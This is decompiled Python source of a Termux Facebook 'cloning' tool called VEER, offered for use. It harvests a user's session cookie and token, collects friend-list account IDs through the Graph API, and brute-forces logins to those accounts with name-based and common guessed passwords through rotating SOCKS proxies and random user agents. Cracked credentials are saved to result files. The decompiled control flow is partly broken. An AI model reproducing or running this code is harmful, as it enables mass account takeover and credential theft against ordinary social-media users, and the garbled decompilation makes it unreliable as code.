# Source Generated with Decompyle++
# File: dec.pyc (Python 3.10)

import requests
import bs4
import json
import os
import sys
import random
import datetime
import time
import re
import urllib3

try:
    import rich
finally:
    pass
if ImportError:
    os.system('pip install rich')
    time.sleep(1)
    
    try:
        import rich
    finally:
        pass
    if ImportError:
        exit('Cannot Install Rich Module, Try Manual Install (pip install rich)')
    


from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as nel
import base64
exec(base64.b64decode(b'ZnJvbSByaWNoIGltcG9ydCBwcmludCBhcyBwYW5qaWhpdGFt=='))
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from rich import print as rprint
from rich import pretty
from rich.text import Text as tekz
pretty.install()
CON = sol()
ugen2 = []
ugen = []
ugen3 = []
cokbrut = []
ses = requests.Session()
princp = []
pwv = []

try:
    prox = requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks5&timeout=100000&country=all&ssl=all&anonymity=all').text
    open('.prox.txt', 'w').write(prox)
finally:
    pass
if Exception:
    e = None
    
    try:
        print('[[\x1b[1;92m=>\x1b[1;97m] [\x1b[1;96mk4long666')
    finally:
        e = None
        del e
    e = None
    del e
    prox = open('.prox.txt', 'r').read().splitlines()
    for xd in range(10000):
        a = 'Mozilla/5.0 (Symbian/3; Series60/'
        b = random.randrange(1, 9)
        c = random.randrange(1, 9)
        d = 'Nokia'
        e = random.randrange(100, 9999)
        f = '/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/'
        g = random.randrange(1, 9)
        h = random.randrange(1, 4)
        i = random.randrange(1, 4)
        j = random.randrange(1, 4)
        k = 'Mobile Safari/535.1'
        uaku = f'''{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}'''
        ugen2.append(uaku)
        aa = 'Mozilla/5.0 (Linux; U; Android'
        b = random.choice([
            '4',
            '5',
            '6',
            '7',
            '8',
            '9',
            '10',
            '11',
            '12'])
        c = ' en-us; GT-'
        d = random.choice([
            'A',
            'B',
            'C',
            'D',
            'E',
            'F',
            'G',
            'H',
            'I',
            'J',
            'K',
            'L',
            'M',
            'N',
            'O',
            'P',
            'Q',
            'R',
            'S',
            'T',
            'U',
            'V',
            'W',
            'X',
            'Y',
            'Z'])
        e = random.randrange(1, 999)
        f = random.choice([
            'A',
            'B',
            'C',
            'D',
            'E',
            'F',
            'G',
            'H',
            'I',
            'J',
            'K',
            'L',
            'M',
            'N',
            'O',
            'P',
            'Q',
            'R',
            'S',
            'T',
            'U',
            'V',
            'W',
            'X',
            'Y',
            'Z'])
        g = 'AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
        h = random.randrange(73, 100)
        i = '0'
        j = random.randrange(4200, 4900)
        k = random.randrange(40, 150)
        l = 'Mobile Safari/537.36'
        uaku2 = f'''{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'''
        ugen.append(uaku2)
        for x in range(10):
            a = 'Mozilla/5.0 (SAMSUNG; SAMSUNG-GT-S'
            b = random.randrange(100, 9999)
            c = random.randrange(100, 9999)
            d = random.choice([
                'A',
                'B',
                'C',
                'D',
                'E',
                'F',
                'G',
                'H',
                'I',
                'J',
                'K',
                'L',
                'M',
                'N',
                'O',
                'P',
                'Q',
                'R',
                'S',
                'T',
                'U',
                'V',
                'W',
                'X',
                'Y',
                'Z'])
            e = random.choice([
                'A',
                'B',
                'C',
                'D',
                'E',
                'F',
                'G',
                'H',
                'I',
                'J',
                'K',
                'L',
                'M',
                'N',
                'O',
                'P',
                'Q',
                'R',
                'S',
                'T',
                'U',
                'V',
                'W',
                'X',
                'Y',
                'Z'])
            f = random.choice([
                'A',
                'B',
                'C',
                'D',
                'E',
                'F',
                'G',
                'H',
                'I',
                'J',
                'K',
                'L',
                'M',
                'N',
                'O',
                'P',
                'Q',
                'R',
                'S',
                'T',
                'U',
                'V',
                'W',
                'X',
                'Y',
                'Z'])
            g = random.choice([
                'A',
                'B',
                'C',
                'D',
                'E',
                'F',
                'G',
                'H',
                'I',
                'J',
                'K',
                'L',
                'M',
                'N',
                'O',
                'P',
                'Q',
                'R',
                'S',
                'T',
                'U',
                'V',
                'W',
                'X',
                'Y',
                'Z'])
            h = random.randrange(1, 9)
            i = '; U; Bada/1.2; en-us) AppleWebKit/533.1 (KHTML, like Gecko) Dolfin/'
            j = random.randrange(1, 9)
            k = random.randrange(1, 9)
            l = 'Mobile WVGA SMM-MMS/1.2.0 OPN-B'
            uak = f'''{a}{b}/{c}{d}{e}{f}{g}{h}{i}{j}.{k} {l}'''
            
            def jalan(z):
                for e in z + '\n':
                    sys.stdout.write(e)
                    sys.stdout.flush()
                    time.sleep(0.01)

            
            try:
                os.system('curl https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/socks4.txt -o socks4.txt')
            finally:
                pass
            sock = open('socks4.txt', 'r').read().splitlines()
            
            def uaku():
                
                try:
                    ua = open('bbnew.txt', 'r').read().splitlines()
                    for ub in ua:
                        ugen.append(ub)
                finally:
                    return None
                    a = requests.get('https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks4.txt').text
                    ua = open('.user-agents.txt', 'w')
                    aa = re.findall('line">(.*?)<', str(a))
                    for un in aa:
                        ua.write(un + '\n')
                    ua = open('.user-agents.txt', 'r').read().splitlines()
                    return None


            
            def loading():
                animation = [
                    '[\x1b[1;91m■\x1b[0m□□□□□□□□□]',
                    '[\x1b[1;92m■■\x1b[0m□□□□□□□□]',
                    '[\x1b[1;93m■■■\x1b[0m□□□□□□□]',
                    '[\x1b[1;94m■■■■\x1b[0m□□□□□□]',
                    '[\x1b[1;95m■■■■■\x1b[0m□□□□□]',
                    '[\x1b[1;96m■■■■■■\x1b[0m□□□□]',
                    '[\x1b[1;97m■■■■■■■\x1b[0m□□□]',
                    '[\x1b[1;98m■■■■■■■■\x1b[0m□□]',
                    '[\x1b[1;99m■■■■■■■■■\x1b[0m□]',
                    '[\x1b[1;910m■■■■■■■■■■\x1b[0m]']
                for i in range(10):
                    time.sleep(0.1)
                    sys.stdout.write(f'''\r {N}[{H}•{N}] {H}Loading...{N} ''' + animation[i % len(animation)] + '\x1b[0m ')
                    sys.stdout.flush()
                print('')

            (id, id2, loop, ok, cp, akun, oprek, method, lisensiku, taplikasi, tokenku, uid, lisensikuni) = ([], [], 0, 0, 0, [], [], [], [], [], [], [], [])
            cokbrut = []
            pwpluss = []
            pwnya = []
            
            def cocok():
                
                try:
                    cokbru = open('.cookie.txt').read()
                    cokbrut.append(cokbru)
                finally:
                    return None
                    login_lagi334()
                    return None


            sir = '\x1b[41m\x1b[1;97m'
            x = '\x1b[m'
            P = '\x1b[1;97m'
            M = '\x1b[1;91m'
            H = '\x1b[1;92m'
            K = '\x1b[1;93m'
            B = '\x1b[1;94m'
            U = '\x1b[1;95m'
            O = '\x1b[1;96m'
            N = '\x1b[0m'
            A = '\x1b[1;90m'
            BN = '\x1b[1;107m'
            BBL = '\x1b[1;106m'
            BP = '\x1b[1;105m'
            BB = '\x1b[1;104m'
            BK = '\x1b[1;103m'
            BH = '\x1b[1;102m'
            BM = '\x1b[1;101m'
            BA = '\x1b[1;100m'
            my_color = [
                P,
                M,
                H,
                K,
                B,
                U,
                O,
                N]
            warna = random.choice(my_color)
            dic = {
                '1': 'January',
                '2': 'February',
                '3': 'March',
                '4': 'April',
                '5': 'May',
                '6': 'June',
                '7': 'July',
                '8': 'August',
                '9': 'September',
                '10': 'October',
                '11': 'November',
                '12': 'December' }
            dic2 = {
                '01': 'January',
                '02': 'February',
                '03': 'March',
                '04': 'April',
                '05': 'May',
                '06': 'June',
                '07': 'July',
                '08': 'August',
                '09': 'September',
                '10': 'October',
                '11': 'November',
                '12': 'Devember' }
            tgl = datetime.datetime.now().day
            bln = dic[str(datetime.datetime.now().month)]
            thn = datetime.datetime.now().year
            okc = 'OK-' + str(tgl) + '-' + str(bln) + '-' + str(thn) + '.txt'
            cpc = 'CP-' + str(tgl) + '-' + str(bln) + '-' + str(thn) + '.txt'
            
            def Subscraption():
                ak = 'VEER'
                key1 = open('/data/data/com.termux/files/usr/bin/.mrahsan-cov', 'r').read()
                clear()
                print(logo)
                r1 = requests.get('https://raw.githubusercontent.com/MuDassir009/khattak/main/ktk.txt').text
                if key1 in r1:
                    os.system('clear')
                    print(logo)
                    login()
                    return None
                None.system('clear')
                print(logo)
                jalan('\n%s %s%s Cheaking Veer Tool Subscription ......' % (P, M, P))
                time.sleep(4)
                os.system('clear')
                print(logo)
                print('')
                print('')
                print(' Copy And Send Key To Admin')
                print('')
                print(' Your Key : ' + ak + key1)
                print('')
                name = input(' Type Your Name : ')
                print('')
                input(' Press Enter To Send Key Admin Whatsapp')
                time.sleep(1)
                tks = 'Dear%20Admin,%20Please%20Approved%20My%20Key%20To%20Premium%20%20Thanks%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20Name%20:%20' + name + '%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20%20Key%20%20:%20' + ak + '' + key1
                os.system('am start https://wa.me/+923439635677?text=' + tks)
                Subscraption()

            
            def clear():
                os.system('clear')

            
            def back():
                login()

            
            def banner():
                clear()

            logo = '   \n \x1b[1;37m ##     ##   ########  ########  ########  \n  \x1b[1;31m##     ##   ##        ##        ##     ## \n  \x1b[1;33m##     ##   ##        ##        ##     ## \n  \x1b[1;36m##     ##   ######    ######    ########  \n  \x1b[1;30m ##   ##    ##        ##        ##    ##   \n   \x1b[1;32m ## ##     ##        ##        ##     ##  \n    \x1b[1;34m ###      ########  ########  ##      ##   \n\x1b[1;97m------------------------\x1b[1;97m------------------------\n\x1b[1;31m\x1b[1;37m➣ Author \x1b[1;97m     : \x1b[1;37m      MUDASSIR ALI\n\x1b[1;31m\x1b[1;37m➣ Facebook\x1b[1;97m    :  \x1b[1;37m     VEER KHANOO\n\x1b[1;31m\x1b[1;37m➣ Version\x1b[1;97m     : \x1b[1;37m      3.0.1  \n\x1b[1;31m\x1b[1;37m➣ LIFE STATUS\x1b[1;97m : \x1b[1;37m      SINGLE HON YAWR(🥺🥺)\n\x1b[1;37m------------------------\x1b[1;37m------------------------ '
            print(logo)
            print('\x1b[1;32m Click in 1 and watch the video for those who did not know how to make cookies')
            print('-----------------------------------------------')
            print('\x1b[1;37m [1] How To Get Cookie ')
            print('')
            Baloch = input('\n\x1b[1;37m  Choose : \x1b[38;5;208m')
            if Baloch in ('', ' '):
                exit()
            elif Baloch in ('1', '01'):
                os.system('xdg-open https://youtu.be/RZljygNf1fU')
                print('')
                
                def login():
                    
                    try:
                        token = open('.token.txt', 'r').read()
                        cok = open('.cok.txt', 'r').read()
                        tokenku.append(token)
                        
                        try:
                            sy = requests.get('https://graph.facebook.com/me?fields=id,name&access_token=' + tokenku[0], {
                                'cookie': cok }, **('cookies',))
                            sy2 = json.loads(sy.text)['name']
                            sy3 = json.loads(sy.text)['id']
                            menu(sy2, sy3)
                        finally:
                            return None
                            if KeyError:
                                login_lagi334()
                            return None
                            if requests.exceptions.ConnectionError:
                                li = '# PROBLEM INTERNET CONNECTION, CHECK AND TRY AGAIN'
                                lo = mark(li, 'red', **('style',))
                                sol().print(lo, 'purple', **('style',))
                                exit()
                            return None
                            if IOError:
                                login_lagi334()
                                return None







def login_lagi334():
    os.system('clear')
    print(logo)
    warna = random.choice([
        P,
        M,
        H,
        K,
        B,
        U,
        O,
        N])
    print('\x1b[1;32m If you want to know how to get cookies\x1b[1;37m')
    print('-----------------------------------------------')
    jalan('\n%s %s%s Welcome To Veer Free Tool.....' % (P, M, P))
    print('-----------------------------------------------')
    cookie = input('\n [+] Put Cookie : ')
    if cookie in ('get', 'Get'):
        os.system('xdg-open https://www.facebook.com/veerkhano71')
    loading()
    
    try:
        data = requests.get('https://business.facebook.com/business_locations', {
            'user-agent': 'Mozilla/5.0 (Linux; Android 6.0.1; Redmi 4A Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.92 Mobile Safari/537.36',
            'referer': 'https://www.facebook.com/',
            'host': 'business.facebook.com',
            'origin': 'https://business.facebook.com',
            'upgrade-insecure-requests': '1',
            'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
            'cache-control': 'max-age=0',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8',
            'content-type': 'text/html; charset=utf-8' }, {
            'cookie': cookie }, **('headers', 'cookies'))
        find_token = re.search('(EAAG\\w+)', data.text)
        ken = open('.token.txt', 'w').write(find_token.group(1))
        cok = open('.cok.txt', 'w').write(cookie)
        print(f'''  {x}[{h}•{x}]{h} LOGIN SUCCESSFUL.........Run the again command(\x1b[1;33mpython run.py)!!!!{x} ''')
        time.sleep(1)
        exit()
    finally:
        return None
        if Exception:
            e = None
            
            try:
                os.system('rm -f .token.txt')
                os.system('rm -f .cok.txt')
                print('  %s[%sx%s]%s LOGIN FAILED !!%s' % (x, k, x, x))
                exit()
            finally:
                e = None
                del e
                return None
                e = None
                del e




def loading():
    animation = [
        '[\x1b[1;91m■\x1b[0m□□□□□□□□□]',
        '[\x1b[1;92m■■\x1b[0m□□□□□□□□]',
        '[\x1b[1;93m■■■\x1b[0m□□□□□□□]',
        '[\x1b[1;94m■■■■\x1b[0m□□□□□□]',
        '[\x1b[1;95m■■■■■\x1b[0m□□□□□]',
        '[\x1b[1;96m■■■■■■\x1b[0m□□□□]',
        '[\x1b[1;97m■■■■■■■\x1b[0m□□□]',
        '[\x1b[1;98m■■■■■■■■\x1b[0m□□]',
        '[\x1b[1;99m■■■■■■■■■\x1b[0m□]',
        '[\x1b[1;910m■■■■■■■■■■\x1b[0m]']
    for i in range(10):
        time.sleep(0.1)
        sys.stdout.write(f'''\r {N}[{H}•{N}] {H}Loading...{N} ''' + animation[i % len(animation)] + '\x1b[0m ')
        sys.stdout.flush()
    print('')


def hasil(OK, cp):
    if not len(OK) != 0:
        pass
    if len(cp) != 0:
        print('\n\n  \x1b[1;97m Total OK : \x1b[1;97m %s  \x1b[1;97mVEER_OK.txt' % (H, P, str(len(ok))))
        print('  \x1b[1;97m Total CP :\x1b[1;97m   %s \x1b[1;97mVEER_CP.txt' % (H, P, str(len(cp))))
        input('\x1b[1;97mPress enter to back VEER Menu ')
        menu(my_name, my_id)
        return None


def menu(my_name, my_id):
    
    try:
        token = open('.token.txt', 'r').read()
        cok = open('.cok.txt', 'r').read()
    finally:
        pass

    None if IOError else os.system('clear')
    print(logo)
    jalan('\n%s %s%s\x1b[1;32m              WELCOME  TO VEER FREE TOOL ' % (P, M, P))
    jalan('\n%s %s%s\x1b[1;31m  Jani Logo Mera Youtube Channel Zaror Subscribe Karna Thanks' % (P, M, P))
    time.sleep(4)
    print('')
    os.system('clear')
    print(logo)
    print('')
    print('\x1b[1;37m [1] First SUBSCRIBE MY CHANNEL ')
    print('\x1b[1;37m [2] Follow My Fb ID')
    print('\x1b[1;37m [3] Exit')
    print('')
    Baloch = input('\n\x1b[1;37m  Choose : \x1b[38;5;208m')
    if Baloch in ('', ' '):
        exit()
    elif Baloch in ('3', '03'):
        print('    Thanks\x1a\x1a')
        exit()
    elif Baloch in ('1', '01'):
        os.system('xdg-open https://youtube.com/channel/UCUfuxZE99OfS76bCrCWyqJg')
        print('')
        time.sleep(1)
        print('\x1b[1;37m    Checking Subsacribetion')
        print('')
        input('\n\x1b[1;37m  Type You Are Real Name : \x1b[38;5;208m')
        time.sleep(1)
        print('')
        print('\x1b[1;37m Done ')
        time.sleep(1)
    elif Baloch in ('2', '02'):
        os.system('xdg-open https://www.facebook.com/veerkhano71')
        os.system('clear')
        clear()
        print(logo)
    ip = requests.get('https://api.ipify.org').text
    print(f''' {BM}LOGIN INFO{N}''')
    print(f'''{P} [{H}➣{P}] Your IP   : {ip}''')
    print(f'''{P} [{H}➣{P}] NAME      : {my_name}''')
    print(f'''{P} [{H}➣{P}] Your ID   : {my_id}''')
    print(f''' {BM}OPTION MENU{N}''')
    print('\x1b[1;97m [1] Public Cloning')
    print('\x1b[1;97m [2] Rondom ID Cloning')
    print('\x1b[1;97m [3] Start File Cloning \x1b[1;92m{Abe Lol hy next update} ')
    print('\x1b[1;97m [4] Any Help TO Contact Me')
    print('\x1b[1;97m [00] Log out: (Remove Token)')
    jh = input('\n [+] SELECT MENU : ')
    if jh == '':
        jh('\n %s[%sÃ—%s] Sorry the menu selection is wrong...!' % (N, M, N))
        time.sleep(2)
        menu()
    print('-----------------------------------------------')
    if jh in ('1', '01'):
        dump_publik()
    elif jh in ('2', '02'):
        multicrack()
    elif jh in ('3', '03'):
        crack_file()
    elif jh in ('4', '04'):
        os.system('xdg-open https://wa.me/+923439635677')
    elif jh in ('0', '00'):
        print('')
        titik = [
            '\x1b[1;92m.   ',
            '\x1b[1;93m..  ',
            '\x1b[1;96m... ',
            '\x1b[1;92m.   ',
            '\x1b[1;93m..  ',
            '\x1b[1;96m... ']
        for x in titik:
            sys.stdout.write('\r %s[%s!%s] Deleting Token/Cookie %s' % (N, M, N, x))
            sys.stdout.flush()
            time.sleep(1)
            os.system('rm -rf .token.txt')
            os.system('rm -rf .cokie.txt')
            jalan('\n %s[%sâœ“%s] %sSuccessfully delete Token/Cookie...' % (N, H, N, H))
            jalan('\n %s[%sâœ“%s] Retrun SC type "%spython run.py%s"' % (N, H, N, H, N))
            exit()
    jalan('\n %s[%sÃ—%s] Sorry menu [%s%s%s] moderate improvement...!' % (N, M, N, M, jh, N))
    time.sleep(1)
    menu(my_name, my_id)
    return login().plerr(id)


def dump_publik():
    clear()
    print(logo)
    
    try:
        cok = open('.cok.txt', 'r').read()
    finally:
        pass

    pil = None if IOError else input(' %s[%s?%s] Enter ID/Uname : %s' % (N, K, N, H))
    
    try:
        koh2 = requests.get('https://graph.facebook.com/v2.0/' + pil + '?fields=friends.limit(5000)&access_token=' + tokenku[0], {
            'cookie': cok }, **('cookies',)).json()
        for pi in koh2['friends']['data']:
            
            try:
                id.append(pi['id'] + '|' + pi['name'])
            finally:
                continue
                continue
                print('\x1b[1;37m Total IDs : %s ' % len(id))
                setting()
                return None
                if requests.exceptions.ConnectionError:
                    print(f''' {BM}BAD CONNECTION !!{N}''')
                    exit()
                    return None
                if KeyError:
                    jalan(' %s[%sÃ—%s] Sorry %sID is not public/Invalid token%s' % (N, M, N, M, N))
                    time.sleep(1)
                    dump_publik()()
                    return None




def multicrack():
    clear()
    print(logo)
    
    try:
        cok = open('.cok.txt', 'r').read()
    finally:
        pass
    if IOError:
        exit()
    else:
        
        try:
            nanya_keun = int(input(' %s[%s?%s] \x1b[1;37mEnter the target amount : %s' % (N, P, N, P)))
        finally:
            pass
        nanya_keun = 100000000
        for mnh in range(nanya_keun):
            mnh += 1
            print()
            pil = input('%s[%s?%s] Enter ID/Uname %s%s%s : %s' % (N, P, N, P, mnh, N, P))
            
            try:
                koh2 = requests.get('https://graph.facebook.com/v2.0/' + pil + '?fields=friends.limit(5000)&access_token=' + tokenku[0], {
                    'cookie': cok }, **('cookies',)).json()
                for pi in koh2['friends']['data']:
                    
                    try:
                        id.append(pi['id'] + '|' + pi['name'])
                    finally:
                        continue
                        continue
                        continue
                        if requests.exceptions.ConnectionError:
                            print(f''' {BM}BAD CONNECTION !!{N}''')
                            continue
                        if (KeyError, IOError):
                            jalan(' %s[%sÃ—%s] Sorry %sID is not public/Invalid token%s' % (N, M, N, M, N))
                            time.sleep(1)
                            multicrack()()
                            continue
                        print()
                        print('\x1b[1;37m Total IDs : %s ' % len(id))
                        setting()
                        return None






def crack_file():
    clear()
    print(logo)
    cek = '# CRACK DARI FILE DUMP'
    sol().print(mark(cek, 'red', **('style',)))
    
    try:
        vin = os.listdir('DUMP')
    finally:
        pass

    if None if FileNotFoundError else len(vin) == 0:
        haha = '# YOU DONOT HAVE A DUMP FILE'
        sol().print(mark(haha, 'red', **('style',)))
        time.sleep(2)
        back()
        return None
    gerr = None
    sol().print(mark(gerr, 'red', **('style',)))
    cih = 0
    lol = { }
    for isi in vin:
        
        try:
            hem = open('DUMP/' + isi, 'r').readlines()
        finally:
            pass
        continue
        cih += 1
        if cih < 10:
            nom = '0' + str(cih)
            lol.update({
                str(cih): str(isi) })
            lol.update({
                nom: str(isi) })
            print('[' + nom + '] ' + isi + ' [ ' + str(len(hem)) + ' Account ]' + x)
            continue

        lol.update({
            str(cih): str(isi) })
        print('[' + str(cih) + '] ' + isi + ' [ ' + str(len(hem)) + ' Account ]' + x)
        gerr2 = '# SELECT THE FILES YOU WANT TO CRACK'
        sol().print(mark(gerr2, 'red', **('style',)))
        geeh = input(N + '[' + M + 'âž£' + N + '] TYPE OPTIONS : ')
        
        try:
            geh = lol[geeh]
        finally:
            pass
        if KeyError:
            ric = '# OPTION NOT IN THE MENU'
            sol().print(mark(ric, 'red', **('style',)))
            exit()
        else:
            
            try:
                lin = open('DUMP/' + geh, 'r').read().splitlines()
            finally:
                pass
            hehe = '# FILE NOT AVAILABLE PLEASE TRY BACK'
            sol().print(mark(hehe, 'red', **('style',)))
            time.sleep(2)
            back()
            for xid in lin:
                id.append(xid)
                setting()
                return None




def tipsx():
    print('NEXT UPDATE BRO')


def setting():
    clear()
    print(logo)
    print('')
    print(' \x1b[1;37m [1] START CRACK FROM OLD IDS')
    print(' \x1b[1;37m [2] START CRACK FROM NEW IDS')
    print(' \x1b[1;37m [3] START CRACK FROM RANDOM ID')
    hu = input('\n\x1b[1;32m[+]  CHOOSE : ')
    if hu in ('1', '01'):
        for tua in sorted(id):
            id2.append(tua)
    elif hu in ('2', '02'):
        muda = []
        for bacot in sorted(id):
            muda.append(bacot)
        bcm = len(muda)
        bcmi = bcm - 1
        for xmud in range(bcm):
            id2.append(muda[bcmi])
            bcmi -= 1
    elif hu in ('3', '03'):
        for bacot in id:
            xx = random.randint(0, len(id2))
            id2.insert(xx, bacot)
    else:
        ric = '# OPTION NOT IN THE MENU'
        sol().print(mark(ric, 'red', **('style',)))
        exit()
        clear()
    print(logo)
    print('')
    print(' \x1b[1;37m [1] MOBILE FACEBOOK [\x1b[1;32mSlow]')
    print(' \x1b[1;37m [2] TOUCH FACEBOOK [\x1b[1;33mFast]')
    print(' \x1b[1;37m [3] MBASIC FACEBOOK [\x1b[1;36mNormal]')
    hc = input('\n [+]  SELECT LOGIN : ')
    if hc in ('1', '01'):
        method.append('mobile')
    elif hc in ('2', '02'):
        method.append('touch')
    elif hc in ('3', '03'):
        method.append('mbasic')
    elif hc in ('4', '04'):
        method.append('cracktouch')
    else:
        method.append('mobile')
        clear()
    print(logo)
    print(' \x1b[1;37m ADD MANUALPASSWORD {\x1b[1;35my/t}')
    pwplus = input('\n [+]  TYPE OPTIONS : ')
    if pwplus in ('y', 'Y'):
        pwpluss.append('ya')
        clear()
        print(logo)
        print('\x1b[1;33m[âž£] USE COMMA FOR PASSWORD SEPARATE ')
        print('\x1b[1;32m[âž£] MAXIMUM 5 PASSWORD ONLY')
        print('\x1b[1;35m[âž£] EXAMPLE PASSWORD : Pakistan,Pakistan123, 123456, 786786, 786000\x1b[1;37m')
        print('-----------------------------------------------')
        pwku = input('\n [+]  ADDITIONAL PASSWORD : ')
        pwkuh = pwku.split(',')
        for xpw in pwkuh:
            pwnya.append(xpw)
    else:
        pwpluss.append('no')
    passwrd()


def passwrd():
    clear()
    print(logo)
    print('\x1b[38;5;208m\r Use flight (airplane) mode before use\x1b[1;37m')
    print('-----------------------------------------------')
    print('\x1b[1;37m Total  IDs : %s ' % len(id))
    print('\x1b3[1;37m\r Cracking Started...\x1b[1;37m')
    print('-----------------------------------------------')
    with tred(30, **('max_workers',)) as pool:
        for yuzong in id2:
            
            try:
                idf = yuzong.split('|')[0]
                nmf = yuzong.split('|')[1].lower()
                ttl = yuzong.split('|')[2].lower()
            finally:
                pass
            idf = yuzong.split('|')[0]
            nmf = yuzong.split('|')[1].lower()
            frs = nmf.split(' ')[0]
            
            try:
                pwv = []
            finally:
                pass
            pwv = [
                'Pakistan']
            if len(nmf) < 6:
                if len(frs) < 3:
                    pass
                else:
                    pwv.append(frs + '123')
                    pwv.append(frs + '1234')
                    pwv.append(frs + '12345')
            elif len(frs) < 3:
                pwv.append(nmf)
            else:
                pwv.append(nmf)
                pwv.append(frs + '123')
                pwv.append(frs + '1234')
                pwv.append(frs + '12345')
                pwv.append(frs + '786')
                pwv.append(frs + '12')
                pwv.append('Pakistan')
                pwv.append('786786')


            if 'ya' in pwpluss:
                for xpwd in pwnya:
                    pwv.append(xpwd)
            
            if 'mobile' in method:
                pool.submit(crack, idf, pwv, nmf)
                continue
            if 'touch' in method:
                pool.submit(cracktouch, idf, pwv, nmf)
                continue
            if 'mbasic' in method:
                pool.submit(crackmbasic, idf, pwv, nmf)
                continue
            if 'free' in method:
                pool.submit(cracktouch, idf, pwv, nmf)
                continue
            pool.submit(crackmbasic, idf, pwv, nmf)
        None(None, None, None)
    if not None:
        pass
    print('')
    tanya = '# Cheak Result?'
    sol().print(mark(tanya, 'black', **('style',)))
    woi = input(N + '[' + M + '\x1a' + N + '] Do You Want Cheak Result? [y/t] : ')
    if woi in ('y', 'Y'):
        result()
        return None
    None()


def crack(idf, pwv, nmf):
    global cp, ok, loop
    animasi = random.choice([
        '\x1b[1;97m[VEER]'])
    (sys.stdout.write(f'''\r {animasi} {P}{P}{loop}{N}|{P}{len(id)}{P} {P}[{P}OK:{ok}{P}] {P}[{P}CP:{cp}{P}]  | {P}{'{:.0%}'.format(loop / float(len(id)))}{P}'''),)
    sys.stdout.flush()
    ua = random.choice(ugen)
    ua2 = random.choice(ugen2)
    ses = requests.Session()
    for pw in pwv:
        
        try:
            pw = pw.lower()
            nip = random.choice(prox)
            proxs = {
                'http': 'socks5://' + nip }
            ses.headers.update({
                'Host': 'm.facebook.com',
                'upgrade-insecure-requests': '1',
                'user-agent': ua,
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                'dnt': '1',
                'x-requested-with': 'mark.via.gp',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-mode': 'cors',
                'sec-fetch-user': 'empty',
                'sec-fetch-dest': 'document',
                'referer': 'https://m.facebook.com/',
                'accept-encoding': 'gzip, deflate br',
                'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8' })
            p = ses.get('https://p.facebook.com/login/device-based/password/?uid=' + idf + '&flow=login_no_pin&refsrc=deprecated&_rdr')
            dataa = {
                'lsd': re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),
                'jazoest': re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),
                'uid': idf,
                'next': 'https://p.facebook.com/login/save-device/',
                'flow': 'login_no_pin',
                'pass': pw }
            koki = ';'.join((lambda .0: [ '%s=%s' % (key, value) for key, value in .0 ])(p.cookies.get_dict().items()))
            koki += ' m_pixel_ratio=2.625; wd=412x756'
            heade = {
                'Host': 'm.facebook.com',
                'cache-control': 'max-age=0',
                'upgrade-insecure-requests': '1',
                'origin': 'https://m.facebook.com',
                'content-type': 'application/x-www-form-urlencoded',
                'user-agent': ua,
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                'x-requested-with': 'mark.via.gp',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-mode': 'cors',
                'sec-fetch-user': 'empty',
                'sec-fetch-dest': 'document',
                'referer': 'https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F',
                'accept-encoding': 'gzip, deflate br',
                'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8' }
            po = ses.post('https://p.facebook.com/login/device-based/validate-password/?shbl=0', dataa, {
                'cookie': koki }, heade, False, proxs, **('data', 'cookies', 'headers', 'allow_redirects', 'proxies'))
            if 'checkpoint' in po.cookies.get_dict().keys():
                print(f'''\r\x1b[38;5;208m [VEER-CP] {idf} | {pw}''')
                open('CP/' + okc, 'a').write(idf + '|' + pw + '|' + ua + '\n')
                akun.append(idf + '|' + pw)
                cp += 1
        finally:
            pass
        if 'c_user' in ses.cookies.get_dict().keys():
            ok += 1
            coki = po.cookies.get_dict()
            kuki = ';'.join((lambda .0: [ '%s=%s' % (key, value) for key, value in .0 ])(ses.cookies.get_dict().items()))
            (month, day, year) = kuki.split('/')
            month = dec_ttl[month]
            print(f'''\r\x1b[1;92m [VEER-OK] {idf} | {pw}''')
            open('OK/' + okc, 'a').write(idf + '|' + pw + '|' + ua + '\n')
        if (KeyError, IOError):
            month = ''
            day = ''
            year = ''
        else:
            print(f'''\r\x1b[1;92m [VEER-OK] {idf} | {pw}''')
            open('OK/' + okc, 'a').write(idf + '|' + pw + '\n')

    time.sleep(61)
    continue
    loop += 1


def crackmbasic(idf, pwv, nmf):
    bi = random.choice([
        M,
        P,
        H,
        K,
        B])
    pers = loop * 100 / len(id2)
    fff = '%'
    nip = random.choice(prox)
    proxs = {
        'http': 'socks5://' + nip }
    ua = random.choice(ugent)
    ua2 = random.choice(ugent2)
    ses = requests.Session()
